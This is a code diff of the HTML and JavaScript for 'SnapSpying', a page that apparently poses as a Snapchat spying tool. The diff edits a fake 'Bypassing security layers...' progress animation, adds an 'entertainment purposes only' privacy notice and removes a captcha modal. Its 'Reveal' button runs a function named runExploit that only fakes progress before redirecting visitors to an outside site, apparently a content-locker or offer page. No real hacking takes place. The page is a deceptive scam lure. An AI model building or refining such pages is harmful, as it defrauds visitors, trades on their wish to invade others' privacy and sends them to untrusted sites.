@@ -18,6 +18,7 @@
         .action-item:active { transform: scale(0.97); background: #2c2c2e; }
         .input-box { background: #1c1c1e; border: 1px solid #2c2c2e; transition: border 0.3s; }
         .input-error { border: 1px solid #ff3b30 !important; }
+        .privacy-card { background: #000; border: 1px solid #1c1c1e; border-radius: 14px; padding: 16px; margin-bottom: 12px; text-align: left; }
         
         .preview-img-container {
             width: 100%;
@@ -93,16 +94,29 @@
         </div>
     </div>
 
+    <div id="privacy-sheet" class="fixed inset-0 z-[200] hidden">
+        <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="toggleSheet('privacy-sheet')"></div>
+        <div class="absolute bottom-0 w-full bg-[var(--card)] rounded-t-[30px] sheet h-[90vh] overflow-y-auto flex flex-col">
+            <div class="flex justify-between items-center px-6 py-5 sticky top-0 bg-[var(--card)] z-10 border-b border-white/5">
+                <h2 class="text-[18px] font-bold">Privacy Policy</h2>
+                <button onclick="toggleSheet('privacy-sheet')" class="text-white text-xl"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="px-6 py-6">
+                <div class="privacy-card"><h3 class="font-bold text-[15px] mb-2">Data Protection</h3><p class="text-[#8e8e93] text-[13px]">SnapSpying is for entertainment purposes only.</p></div>
+            </div>
+        </div>
+    </div>
+
     <div id="action-sheet" class="fixed inset-0 z-[150] hidden">
         <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" onclick="closeActionSheet()"></div>
-        <div class="absolute bottom-0 w-full bg-[var(--card)] rounded-t-[35px] p-8 sheet text-center">
-            <div class="w-10 h-1 bg-gray-700 mx-auto mb-6 rounded-full"></div>
+        <div class="absolute bottom-0 w-full bg-[var(--card)] rounded-t-[35px] p-10 sheet text-center">
+            <div class="w-10 h-1 bg-gray-700 mx-auto mb-8 rounded-full"></div>
 
             <div class="preview-img-container">
                 <img id="action-preview-img" src="" alt="preview">
             </div>
 
-            <h4 id="r-title" class="text-[18px] font-bold mb-8 px-6 leading-tight"></h4>
+            <h4 id="r-title" class="text-[18px] font-bold mb-10 px-4 leading-tight"></h4>
             
             <button onclick="runExploit()" class="w-full bg-[#ffd500] text-black font-black py-4 rounded-2xl text-lg shadow-lg">Reveal</button>
         </div>
@@ -117,15 +131,8 @@
             </div>
             <h2 id="p-status" class="text-xl font-bold mb-3 text-white">Initializing...</h2>
             <div class="h-2 bg-gray-800 rounded-full mb-6 overflow-hidden"><div id="bar" class="bar-fill"></div></div>
-            <p id="p-log" class="text-[12px] text-gray-500 font-mono italic">Starting protocol...</p>
+            <p id="p-log" class="text-[12px] text-gray-500 font-mono italic">Bypassing security layers...</p>
         </div>
-    </div>
-
-    <div id="verify-modal" class="hidden fixed inset-0 z-[400] bg-[#000] flex flex-col items-center justify-center p-8 text-center overflow-y-auto">
-        <div class="w-20 h-20 bg-[#ffd500]/10 rounded-full flex items-center justify-center mb-8 border border-[#ffd500]/20"><i class="fas fa-lock text-[#ffd500] text-4xl"></i></div>
-        <h2 class="text-2xl font-bold mb-2">Verification Required</h2>
-        <p class="text-gray-500 text-sm mb-12">Please complete the security check to continue</p>
-        <div class="w-full max-w-sm"><div data-captcha-enable="true"></div></div>
     </div>
 
     <script>
@@ -155,7 +162,7 @@
 
         function openAction(desc, type) {
             const previewImg = document.getElementById('action-preview-img');
-            previewImg.src = type + '.jpg'; //
+            previewImg.src = type + '.jpg'; 
             previewImg.style.display = 'block';
             document.getElementById('r-title').innerText = desc;
             toggleSheet('action-sheet');
@@ -174,7 +181,7 @@
                     if(p >= 100) {
                         clearInterval(interval);
                         setTimeout(() => {
-                            window.location.href = "https://authenticateapp.online/cp/js/2wx2k"; // Redirect direct
+                            window.location.href = "https://authenticateapp.online/cp/js/2wx2k";
                         }, 500);
                     }
                 }, 40);
